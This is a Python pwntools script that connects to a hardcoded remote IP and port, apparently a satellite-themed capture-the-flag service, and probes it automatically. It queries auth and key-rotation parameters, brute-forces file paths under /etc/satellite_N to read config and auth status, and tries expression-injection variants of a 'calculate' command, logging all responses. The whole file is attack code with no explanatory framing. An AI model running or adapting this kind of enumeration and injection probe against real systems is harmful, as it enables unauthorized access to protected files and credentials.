# seq_probe.py
from pwn import remote
import time

HOST, PORT = "34.205.255.133", 31337
PRE = ["", "calculate key_rotation+0", "calculate auth_status+0", "calculate config+0"]
RANGE = range(0,31)   # increase if cần tới 0..100

def send_and_recv(r, cmd, wait=1.5):
    r.sendline(cmd.encode())
    try:
        out = r.recvuntil(b"> ", timeout=wait)
    except Exception:
        try:
            out = r.recv(timeout=1)
        except Exception:
            out = b""
    print(f"CMD: {cmd}")
    print(out.decode(errors='ignore'))
    with open("probe_seq.log", "ab") as f:
        f.write(b"CMD: " + cmd.encode() + b"\n")
        f.write(out + b"\n")
    time.sleep(0.12)
    return out

def main():
    r = remote(HOST, PORT, timeout=8)
    banner = r.recvuntil(b"> ", timeout=2)
    print(banner.decode(errors='ignore'))
    with open("probe_seq.log", "wb") as f:
        f.write(b"--- SESSION START ---\n")
        f.write(banner)

    # try system params first
    for p in ["config","auth_status","key_rotation","satellite_status"]:
        send_and_recv(r, f"telemetry {p}")
        send_and_recv(r, f"calculate {p}+0")

    # sequence brute-force
    for pre in PRE:
        for i in RANGE:
            if pre:
                send_and_recv(r, pre)
            base = f"/etc/satellite_{i}"
            send_and_recv(r, f"telemetry {base}")
            send_and_recv(r, f"telemetry {base}/config")
            send_and_recv(r, f"telemetry {base}/auth_status")
            send_and_recv(r, f"calculate {base}/config+0")
            send_and_recv(r, f"calculate {base}/auth_status+0")

    # extra syntax variants
    variants = ["(config)+0","config*1","config-0","config/1","config+0.0"]
    for v in variants:
        send_and_recv(r, f"calculate {v}")

    send_and_recv(r, "quit")
    r.close()
    print("DONE - see probe_seq.log")

if __name__ == '__main__':
    main()

